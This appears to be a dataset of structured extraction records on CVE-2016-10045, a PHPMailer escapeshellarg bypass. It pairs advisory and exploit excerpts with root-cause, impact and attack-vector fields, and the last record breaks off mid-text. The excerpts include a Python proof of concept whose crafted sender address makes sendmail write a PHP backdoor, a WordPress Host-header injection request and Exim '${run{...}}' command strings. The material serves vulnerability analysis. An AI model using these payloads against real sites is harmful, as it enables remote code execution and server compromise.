```
{
  "guidelines": "1. First verify if the content relates to the CVE specified based on the official description\n2. If the content does not relate to this CVE, respond with \"UNRELATED\"\n3. If no useful vulnerability information is found, respond with \"NOINFO\" \n4. For relevant content, extract:\n   - Root cause of vulnerability\n   - Weaknesses/vulnerabilities present\n   - Impact of exploitation\n   - Attack vectors\n   - Required attacker capabilities/position\n\nAdditional instructions:\n- Preserve original technical details and descriptions\n- Remove unrelated content\n- Translate non-English content to English\n- Note if the content provides more detail than the official CVE description",
  "response": [
    {
      "cve": "CVE-2016-10045",
      "content": "The following snippet of code from WordPress 4.6 - file wp-includes/pluggable.php:\n\n      if ( !isset( $from_email ) ) {\n              // Get the site domain and get rid of www.\n              $sitename = strtolower( $_SERVER['SERVER_NAME'] );\n              if ( substr( $sitename, 0, 4 ) == 'www.' ) {\n                      $sitename = substr( $sitename, 4 );\n              }\n\n              $from_email = 'wordpress@' . $sitename;\n      }\n\n      /**\n       * Filters the name to associate with the \"from\" email address.\n       * @since 2.3.0\n       *\n       * @param string $from_name Name associated with the \"from\" email address.\n       */\n      $from_name = apply_filters( 'wp_mail_from_name', $from_name );\n\n      $phpmailer->setFrom( $from_email, $from_name );\n\nshows that WordPress sets the email domain based on SERVER_NAME server\nheader when WordPress wp_mail() function is called to send an email (e.g. upon\nuser registration, forgotten password etc.).\n\nAs we can see the from address is formed as follows:\n\n$from_email = 'wordpress@' . $sitename;\n\nIt is then filtered and passed to a vulnerable setFrom() function of PHPMailer which\nwas explained in detail in the previous advisories:\n\n<https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10045-Vuln-Patch-Bypass.html>\n<https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html>\n\nSERVER_NAME server header can be manipulated on default configurations of Apache\nWeb server (most common WordPress deployment) via HOST header of a HTTP request.\n\nUsing this HOST header example, if an attacker triggered wp_mail() function\nby using the forgotten password WordPress feature, the HTTP request would be similar to:\n\nPOST /wordpress/wp-login.php?action=lostpassword HTTP/1.1\nHost: xenialINJECT\n\nand would result in the following parameters passed to /usr/sbin/sendmail :\n\nArg no. 0 == [/usr/sbin/sendmail]\nArg no. 1 == [-t]\nArg no. 2 == [-i]\nArg no. 3 == [-fwordpress@xenialinject]\n\nTo exploit the PHPMailer's mail() injection vulnerability, an attacker would\nhave to be able to append parameters to the domain part.\nHowever, the filtration/validation in place (both on the wordpress side as well as PHPMailer library side) would\nprevent the attacker from injecting white-characters (such as space\nor TAB) and therefore from injecting parameters to sendmail binary.\n\nLooking at the RFC 822 specs however, a potential way to bypass the validation\nwas found. According to:\n<https://www.ietf.org/rfc/rfc822.txt>\n\nemail addresses can contain comments:\n\nThe document gives an email example of with comments in brackets:\n\n\":sysmail\"@  Some-Group. Some-Org,\n          Muhammed.(I am  the greatest) Ali @(the)Vegas.WBA\n\nas a valid email.\n\nA simplified comment example within the domain part would be:\n\njohn@example.com(comment)\n\nThe following request with the HOST header set to:\n\nPOST /wordpress/wp-login.php?action=lostpassword HTTP/1.1\nHost: xenial(tmp1 injected tmp2)\n\nwill not cause errors and will result in the following parameters supplied to\nsendmail :\n\nArg no. 0 == [/usr/sbin/sendmail]\nArg no. 1 == [-t]\nArg no. 2 == [-i]\nArg no. 3 == [-fwordpress@xenial(tmp1]\nArg no. 4 == [injected]\nArg no. 5 == [tmp2)]\n\n\n\nDirect code execution with Exim4 MTA\n--------------------------------\n\nThe discovered Exim MTA vector, in its most basic form works\nin the following way:\n\nsendmail -be '${run{/bin/true}{true}{false}}'\ntrue\n\nThe -be switch enables string expansion testing mode.\nThe above expansion executes /bin/true and returns the value from\nthe brackets based on the exit code.\n\nSimilarly, the expansion:\nsendmail -be '${run{/bin/bash -c \"id\"}{yes}{no}}'\n\nwould execute id command.",
      "root_cause": "The vulnerability stems from the insufficient sanitization of the email address passed to the `mail()` function, specifically when using a user-controlled `SERVER_NAME` header in WordPress, which is passed to the `setFrom()` method of the PHPMailer library. The combination of `escapeshellarg()` and `escapeshellcmd()` with a crafted email string allows injection of parameters to the `sendmail` command.",
      "vulnerabilities": [
        "Improper sanitization of email addresses.",
        "Vulnerable PHPMailer `setFrom()` function.",
		"Manipulation of SERVER_NAME via HOST header"
      ],
      "impact": "Remote code execution on the target server, potentially leading to a full compromise of the web application.",
      "attack_vectors": [
        "Manipulating the `HOST` header in HTTP requests.",
        "Injecting parameters via RFC822 comment syntax in email addresses.",
        "Exploiting the mail() function in PHP.",
		"Using the Exim MTA's string expansion feature"
      ],
      "capabilities": "The attacker needs to send an HTTP request with a crafted `Host` header to a WordPress installation that triggers a mail function. The attacker does not need any prior authentication or access."
    },
    {
      "cve": "CVE-2016-10045",
       "content": "#!/usr/bin/python\n#\n# Exploit Title: [RCE for PHPMailer < 5.2.20 with Exim MTA]\n# Date: [16/06/2017]\n# Exploit Author: [@phackt\_ul]\n# Software Link: [https://github.com/PHPMailer/PHPMailer]\n# Version: [< 5.2.20]\n# Tested on: [Debian x86/x64]\n# CVE : [CVE-2016-10033,CVE-2016-10074,CVE-2016-10034,CVE-2016-10045]\n#\n# @phackt\_ul - https://phackt.com\n#\n# All credits go to Dawid Golunski (@dawid\_golunski) - https://legalhackers.com\n# and its research on PHP libraries vulns\n#\n# PHPMailer < 5.2.18 Remote Code Execution (CVE-2016-10033)\n# PHPMailer < 5.2.20 Remote Code Execution (CVE-2016-10045) - escapeshellarg() bypass\n# SwiftMailer <= 5.4.5-DEV Remote Code Execution (CVE-2016-10074)\n# Zend Framework / zend-mail < 2.4.11 - Remote Code Execution (CVE-2016-10034)\n#\n# ExploitBox project:\n# https://ExploitBox.io\n#\n# Full advisory URL:\n# https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html\n# https://legalhackers.com/videos/PHPMailer-Exploit-Remote-Code-Exec-Vuln-CVE-2016-10033-PoC.html\n# http://pwnscriptum.com/\n#\n# --------------------------------------------------------\n# Enhanced for Exim MTA\n#\n# N.B:\n# The original author's method in the PHPMailer POC (for sendmail MTA) uses the RFC 3696\n# double quotes technique associated with the -oQ -X options to log mailer traffic and to create\n# the backdoor. This technique is not facing some payload size issues because the payload\n# was in the email body.\n#\n# For Exim:\n# The original author's Wordpress 4.6 POC for Exim combines the comment syntax (RFC 822)\n# and the Exim expansion mode techniques. The use of substr on spool\_directory and tod\_log\n# expansion variables in order to bypass the PHP mail() escaping may leads to large\n# email addresses payloads. However the comment syntax validateAddress() technique does not\n# face any size limitation but its use can not be applied for PHPMailer < 5.2.20.\n#\n# Goal:\n# The use of double quotes validateAdresse() technique (and it's patch bypass for PHPMailer < 5.5.20)\n# combined with the Exim expansion mode technique may leads to large payloads quickly facing addresses\n# size limit here (260 chars) and so not matching the pcre8 regexp in the validateAddress() function.\n# We are now base64 encoding the command in order to bypass escapeshellcmd() and allowing larger payloads.\n#\n#\n# Usage:\n# ./rce\_phpmailer\_exim4.py -url http://victim/phpmailer/ -cf contact\_form.php -ip 192.168.1.109 -p 1337",
       "root_cause": "The root cause of the vulnerability is the insufficient sanitization of the email address passed to the `mail()` function, specifically in the `setFrom()` method of the PHPMailer library. It leverages a bypass to `escapeshellarg()` using double quotes and an extra backslash, and further leverages Exim MTA expansion modes through the '-be' parameter to achieve command execution.",
      "vulnerabilities": [
        "Insufficient input sanitization when building command-line arguments.",
        "Vulnerable `setFrom()` method in PHPMailer.",
		"The ability to inject arbitrary arguments to sendmail due to improper escaping",
        "Exploitation of Exim MTA expansion mode."
      ],
      "impact": "Remote code execution on the target server through arbitrary command execution, allowing a full system compromise.",
      "attack_vectors": [
        "Manipulating email sender address through contact forms or other email inputs.",
		"Using a specially crafted email address that includes shell expansion characters to trigger Exim command execution",
        "Using the '-be' option of exim to execute shell commands through the mail() function in PHP"
      ],
      "capabilities": "An attacker needs to inject a crafted email address into a PHPMailer application that uses Exim MTA for sending email."
    },
    {
      "cve": "CVE-2016-10045",
      "content": "## PHPMailer/SwiftMailer/ZendFramework Video PoC Exploit\n\n## [PHPMailer < 5.2.18 Remote Code Execution (CVE-2016-10033)](https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html)[PHPMailer < 5.2.20 Remote Code Execution (CVE-2016-10045)](https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10045-Vuln-Patch-Bypass.html)[SwiftMailer <= 5.4.5-DEV Remote Code Execution (CVE-2016-10074)](http://legalhackers.com/advisories/SwiftMailer-Exploit-Remote-Code-Exec-CVE-2016-10074-Vuln.html)[Zend Framework / zend-mail < 2.4.11 - Remote Code Execution (CVE-2016-10034)](https://legalhackers.com/advisories/ZendFramework-Exploit-ZendMail-Remote-Code-Exec-CVE-2016-10034-Vuln.html)Discovered by **Dawid Golunski** [Follow @dawid\_golunski](https://twitter.com/dawid_golunski) <https://legalhackers.com> **Description:** The video below demonstrates how an attacker could potentially compromise a website (achieve remote code execution) by exploiting one of the vulnerabilities linked above in a web application (Contact Form) implemented with the use of: PHPMailer, Zend Framework (zend-mail) and SwiftMailer. The video focuses on PHPMailer however the attack flow is common for each of the affected frameworks/libraries. Exploit shown in the video can be downloaded from: [PHPMailer/SwiftMailer/Zend-mail exploit](https://legalhackers.com/exploits/CVE-2016-10033/10045/10034/10074/PwnScriptum_RCE_exploit.py)",
      "root_cause": "The root cause of the vulnerability is insufficient sanitization of email addresses passed to PHPMailer, leading to command injection in the mail() function.",
       "vulnerabilities": [
        "Insecure input sanitization.",
        "Vulnerable PHPMailer functions are called with user controlled data.",
        "Command injection via mail() function."
      ],
      "impact": "Remote code execution",
      "attack_vectors": [
        "Crafting a malicious email address that bypasses sanitization.",
        "Using that malicious address as a `from` parameter in the contact form."
      ],
      "capabilities": "The attacker needs to be able to submit form data that will trigger sending of email using vulnerable version of PHPMailer. No other user privilege is needed."
    },
    {
       "cve": "CVE-2016-10045",
        "content": "=============================================\n- Discovered by: Dawid Golunski\n- dawid[at]legalhackers.com\n- https://legalhackers.com\n- CVE-2016-10045\n- Release date: 27.12.2016\n- Last revision: 28.12.2016\n- Revision 3.0\n- Severity: Critical\n=============================================\nI. VULNERABILITY\n-------------------------\nPHPMailer < 5.2.20 Remote Code Execution (0day Patch Bypass/exploit)\nII. BACKGROUND\n-------------------------\n\"PHPMailer continues to be the world's most popular transport class, with an\nestimated 9 million users worldwide. Downloads continue at a significant\npace daily.\"\n<http://phpmailer.worxware.com/>\n\"Probably the world's most popular code for sending email from PHP!\nUsed by many open-source projects: WordPress, Drupal, 1CRM, SugarCRM, Yii,\nJoomla! and many more\"\n<https://github.com/PHPMailer/PHPMailer>\nIII. INTRODUCTION\n-------------------------\nAn independent research uncovered a critical vulnerability in PHPMailer that\ncould potentially be used by (unauthenticated) remote attackers to achieve\nremote arbitrary code execution in the context of the web server user and\nremotely compromise the target web application.\nTo exploit the vulnerability an attacker could target common website\ncomponents such as contact/feedback forms, registration forms, password\nemail resets and others that send out emails with the help of a vulnerable\nversion of the PHPMailer class.\nThe first patch of the vulnerability CVE-2016-10033 was incomplete.\nThis advisory demonstrates the bypass of the patch.\nThe bypass allows to carry out Remote Code Execution on all current\nversions (including 5.2.19).\nNOTE:\nThe vulnerability / patch bypass was responsibly reported to the vendor\nin private on December 26th and a new CVE was issued by MITRE on the same day.\nHowever a potential bypass was publicly discussed on the oss-sec list.\nHolding the advisory further would serve no purpose which is what triggered\nthe earlier release of this advisory.\nIV. DESCRIPTION\n-------------------------\nThe patch for CVE-2016-10033 vulnerability added in PHPMailer 5.2.17\nsanitizes the $Sender variable by applying escapeshellarg() escaping\nbefore the value is passed to mail() function.\nIt does not however take into account the clashing of the\nescapeshellarg() function with internal escaping with escapeshellcmd()\nperformed by mail() function on the 5th parameter.\nAs a result it is possible to inject an extra quote that does not get\nproperly escaped and break out of the escapeshellarg() protection\napplied by the patch in PHPMailer 5.2.17.\nFor example:\n$mail->SetFrom(\"\\\"Attacker\\' -Param2 -Param3\\\"@test.com\", 'Client Name');\nwill result in the followig list of arguments passed to sendmail program:\nArg no. 0 == [/usr/sbin/sendmail]\nArg no. 1 == [-t]\nArg no. 2 == [-i]\nArg no. 3 == [-f\\\"Attacker\\\\]\nArg no. 4 == [-Param2]\nArg no. 5 == [-Param3\"@test.com']\nAn attacker could pass the -X parameter of sendmail to write out a\nlog file with arbitrary PHP code.\nThis makes the current latest 5.2.19 and 5.2.18 versions of PHPMailer\nvulnerable to Remote Code Execution despite the patch.\nA working PoC is presented below.",
       "root_cause": "The root cause of the vulnerability is the insufficient sanitization of the email address passed to the `mail()` function, specifically in the `setFrom()` method of the PHPMailer library. It is a bypass of the fix for CVE-2016-10033, and leverages a clash between `escapeshellarg()` and `escapeshellcmd()` leading to command injection.",
      "vulnerabilities": [
        "Improper sanitization of email addresses.",
        "Vulnerable PHPMailer `setFrom()` function.",
		"Bypass of `escapeshellarg` through nested escaping using `escapeshellcmd()`.",
        "Command injection in the `mail()` function."
      ],
      "impact": "Remote code execution on the target server, potentially leading to a full compromise of the web application.",
      "attack_vectors": [
        "Injecting a crafted email address via vulnerable input fields like a contact form",
        "Exploiting the mail() function in PHP with a crafted sender address"
      ],
      "capabilities": "The attacker needs to be able to submit form data that will trigger sending of email using vulnerable version of PHPMailer. No other user privilege is needed."
    },
    {
      "cve": "CVE-2016-10045",
      "content": "PHPMailer RCE PoC Exploits\nPHPMailer < 5.2.18 Remote Code Execution PoC Exploit (CVE-2016-10033)\n+\nPHPMailer < 5.2.20 Remote Code Execution PoC Exploit (CVE-2016-10045)\n(the bypass of the first patch for CVE-2016-10033)\nDiscovered and Coded by:\nDawid Golunski\n@dawid\_golunski\n<https://legalhackers.com>\n\nRW\_DIR = \"/var/www/html/uploads\"\nurl = 'http://VictimWebServer/contact\_form.php' # Set destination URL here\n# Choose/uncomment one of the payloads:\n# PHPMailer < 5.2.18 Remote Code Execution PoC Exploit (CVE-2016-10033)\n#payload = '\"attacker\\\\\" -oQ/tmp/ -X%s/phpcode.php some\"@email.com' % RW\_DIR\n# Bypass / PHPMailer < 5.2.20 Remote Code Execution PoC Exploit (CVE-2016-10045)\npayload = \"\\\"attacker\\\\' -oQ/tmp/ -X%s/phpcode.php some\\\"@email.com\" % RW\_DIR\n######################################\n# PHP code to be saved into the backdoor php file on the target in RW\_DIR\nRCE\_PHP\_CODE = \"php phpinfo(); ?\"\npost\_fields = {'action': 'send', 'name': 'Jas Fasola', 'email': payload, 'msg': RCE\_PHP\_CODE}\n# Attack\ndata = urllib.urlencode(post\_fields)\nreq = urllib2.Request(url, data)\nresponse = urllib2.urlopen(req)\nthe\_page = response.read()",
      "root_cause": "The root cause is a bypass of the fix for CVE-2016-10033. By crafting a specific email address, an attacker can inject parameters into the `sendmail` command despite the use of `escapeshellarg()` through a nested escaping issue when `escapeshellcmd()` is used internally by PHP's `mail()` function.",
       "vulnerabilities": [
        "Improper input sanitization when calling the mail() function.",
        "PHPMailer's setFrom method is vulnerable to crafted input.",
        "Bypass of `escapeshellarg()` through nested escaping."
      ],
      "impact": "Remote code execution is possible due to injection of parameters that cause sendmail to write a log file with attacker controlled content.",
      "attack_vectors": [
        "Sending crafted input via a contact form or any other interface where from address parameter can be influenced",
        "Exploiting the mail() function in PHP"
      ],
      "capabilities": "The attacker needs to send an HTTP request with a crafted email address to a website running a vulnerable version of PHPMailer"
    },
    {
      "cve": "CVE-2016-10045",
      "content": "=============================================\n- Discovered by: Dawid Golunski\n- dawid[at]legalhackers.com\n- https://legalhackers.com\n- CVE-2016-10045\n- Release date: 27.12.2016\n- Last revision: 28.12.2016\n- Revision 3.0\n- Severity: Critical\n=============================================\nI. VULNERABILITY\n-------------------------\nPHPMailer < 5.2.20 Remote Code Execution (0day Patch Bypass/exploit)\nII. BACKGROUND\n-------------------------\n\"PHPMailer continues to be the world's most popular transport class, with an\nestimated 9 million users worldwide. Downloads continue at a significant\npace daily.\"\n<http://phpmailer.worxware.com/>\n\"Probably the world's most popular code for sending email from PHP!\nUsed by many open-source projects: WordPress, Drupal, 1CRM, SugarCRM, Yii,\nJoomla! and many more\"\n<https://github.com/PHPMailer/PHPMailer>\nIII. INTRODUCTION\n-------------------------\nAn independent research uncovered a critical vulnerability in PHPMailer that\ncould potentially be used by (unauthenticated) remote attackers to achieve\nremote arbitrary code execution in the context of the web server user and\nremotely compromise the target web application.\nTo exploit the vulnerability an attacker could target common website\ncomponents such as contact/feedback forms, registration forms, password\nemail resets and others that send out emails with the help of a vulnerable\nversion of the PHPMailer class.\nThe first patch of the vulnerability CVE-2016-10033 was incomplete.\nThis advisory demonstrates the bypass of the patch.\nThe bypass allows to carry out Remote Code Execution on all current\nversions (including 5.2.19).\nIV. DESCRIPTION\n-------------------------\nThe patch for CVE-2016-10033 vulnerability added in PHPMailer 5.2.17\nsanitizes the $Sender variable by applying escapeshellarg() escaping\nbefore the value is passed to mail() function.\nIt does not however take into account the clashing of the\nescapeshellarg() function with internal escaping with escapeshellcmd()\nperformed by mail() function on the 5th parameter.\nAs a result it is possible to inject an extra quote that does not get\nproperly escaped and break out of the escapeshellarg() protection\napplied by the patch in PHPMailer 5.2.17.\nFor example:\n$mail->SetFrom(\"\\\"Attacker\\' -Param2 -Param3\\\"@test.com\", 'Client Name');\nwill result in the followig list of arguments passed to sendmail program:\nArg no. 0 == [/usr/sbin/sendmail]\nArg no. 1 == [-t]\nArg no. 2 == [-i]\nArg no. 3 == [-f\\\"Attacker\\\\]\nArg no. 4 == [-Param2]\nArg no. 5 == [-Param3\"@test.com']",
      "root_cause": "The root cause of the vulnerability is that the `escapeshellarg()` function used in PHPMailer 5.2.17 to sanitize the sender's address is insufficient. Due to the internal escaping using the `escapeshellcmd()` function in PHP's `mail()` function, a specially crafted email address can bypass the sanitization and inject parameters into the `sendmail` command.",
       "vulnerabilities": [
        "Insecure sanitization of email addresses",
        "Vulnerable PHPMailer `setFrom()` function",
        "Bypass of `escapeshellarg()` through nested escaping",
        "Command injection in the `mail()` function"
      ],
      "impact": "The impact of this vulnerability is the ability to achieve Remote Code Execution (RCE) on the target server. An attacker could use this vulnerability to fully compromise a web application.",
      "attack_vectors": [
        "Crafted email address injected through user-controlled input (e.g., a contact form).",
		"Mail() function in PHP",
        "Exploiting the way PHPMailer processes email address and command parameters"
      ],
      "capabilities": "The attacker needs to inject a crafted email address via an exploitable interface that calls PHPMailer, no other user privileges are required."
    },
    {
      "cve": "CVE-2016-10045",
      "content": "#!/usr/bin/python\n#PHPMailer\_RCE\_exploit.pl\nintro = \"\"\"\nPHPMailer RCE PoC Exploits\nPHPMailer < 5.2.18 Remote Code Execution PoC Exploit (CVE-2016-10033)\n+\nPHPMailer < 5.2.20 Remote Code Execution PoC Exploit (CVE-2016-10045)\n(the bypass of the first patch for CVE-2016-10033)\nDiscovered and Coded by:\nDawid Golunski\n@dawid\_golunski\nhttps://legalhackers.com\n\"\"\"\nusage = \"\"\"\nUsage:\nFull Advisory:\nhttps://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html\nhttps://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10045-Vuln-Patch-Bypass.txt\nPoC Video:\nhttps://legalhackers.com/videos/PHPMailer-Exploit-Remote-Code-Exec-Vuln-CVE-2016-10033-PoC.html\nDisclaimer:\nFor testing purposes only. Do no harm.\n\"\"\"\nimport time\nimport urllib\nimport urllib2\nimport socket\nimport sys\nRW\_DIR = \"/var/www/html/uploads\"\nurl = 'http://VictimWebServer/contact\_form.php' # Set destination URL here\n# Choose/uncomment one of the payloads:\n# PHPMailer < 5.2.18 Remote Code Execution PoC Exploit (CVE-2016-10033)\n#payload = '\"attacker\\\\\" -oQ/tmp/ -X%s/phpcode.php some\"@email.com' % RW\_DIR\n# Bypass / PHPMailer < 5.2.20 Remote Code Execution PoC Exploit (CVE-2016-10045)\npayload = \"\\\"attacker\\\\' -oQ/tmp/ -X%s/phpcode.php some\\\"@email.com\" % RW\_DIR\n######################################\n# PHP code to be saved into the backdoor php file on the target in RW\_DIR\nRCE\_PHP\_CODE = \"php phpinfo(); ?\"\npost\_fields = {'action': 'send', 'name': 'Jas Fasola', 'email': payload, 'msg': RCE\_PHP\_CODE}\n# Attack\ndata = urllib.urlencode(post\_fields)\nreq = urllib2.Request(url, data)\nresponse = urllib2.urlopen(req)\nthe\_page = response.read()",
      "root_cause": "The vulnerability is caused by a bypass of the patch for CVE-2016-10033. The original fix used `escapeshellarg()` to sanitize the email address, but a crafted address using \\\" and \\' can bypass this escaping. The PHP `mail()` function then uses `escapeshellcmd()`, which results in a command injection vulnerability.",
       "vulnerabilities": [
        "Insufficient sanitization of email addresses.",
		"Bypass of escapeshellarg() function.",
		"Vulnerable PHP mail() function",
        "Use of untrusted user input in arguments to shell execution."
      ],
      "impact": "Remote code execution on the target system, allowing the attacker to compromise the target web application.",
      "attack_vectors": [
         "Injection of malicious parameters through a specially crafted 'from' email address.",
         "Exploiting the mail() function in PHP"
      ],
      "capabilities": "The attacker needs to be able to send a request to a vulnerable PHP application with a specially crafted `from` email address to trigger this vulnerability."
    },
    {
       "cve": "CVE-2016-10045",
        "content": "=============================================\n- Discovered by: Dawid Golunski\n- dawid[at]legalhackers.com\n- https://legalhackers.com\n- CVE-2016-10045\n- Release date: 27.12.2016\n- Last revision: 28.12.2016\n- Revision 3.0\n- Severity: Critical\n=============================================\nI. VULNERABILITY\n-------------------------\nPHPMailer < 5.2.20 Remote Code Execution (0day Patch Bypass/exploit)\nII. BACKGROUND\n-------------------------\n\"PHPMailer continues to be the world's most popular transport class, with an\nestimated 9 million users worldwide. Downloads continue at a significant\npace daily.\"\nhttp://phpmailer.worxware.com/\n\"Probably the world's most popular code for sending email from PHP!\nUsed by many open-source projects: WordPress, Drupal, 1CRM, SugarCRM, Yii,\nJoomla! and many more\"\nhttps://github.com/PHPMailer/PHPMailer\nIII. INTRODUCTION\n-------------------------\nAn independent research uncovered a critical vulnerability in PHPMailer that\ncould potentially be used by (unauthenticated) remote attackers to achieve\nremote arbitrary code execution in the context of the web server user and\nremotely compromise the target web application.\nTo exploit the vulnerability an attacker could target common website\ncomponents such as contact/feedback forms, registration forms, password\nemail resets and others that send out emails with the help of a vulnerable\nversion of the PHPMailer class.\nThe first patch of the vulnerability CVE-2016-10033 was incomplete.\nThis advisory demonstrates the bypass of the patch.\nThe bypass allows to carry out Remote Code Execution on all current\nversions (including 5.2.19).\nIV. DESCRIPTION\n-------------------------\nThe patch for CVE-2016-10033 vulnerability added in PHPMailer 5.2.17\nsanitizes the $Sender variable by applying escapeshellarg() escaping\nbefore the value is passed to mail() function.\nIt does not however take into account the clashing of the\nescapeshellarg() function with internal escaping with escapeshellcmd()\nperformed by mail() function on the 5th parameter.\nAs a result it is possible to inject an extra quote that does not get\nproperly escaped and break out of the escapeshellarg() protection\napplied by the patch in PHPMailer 5.2.17.\nFor example:\n$mail->SetFrom(\"\\\"Attacker\\' -Param2 -Param3\\\"@test.com\", 'Client Name');\nwill result in the followig list of arguments passed to sendmail program:\nArg no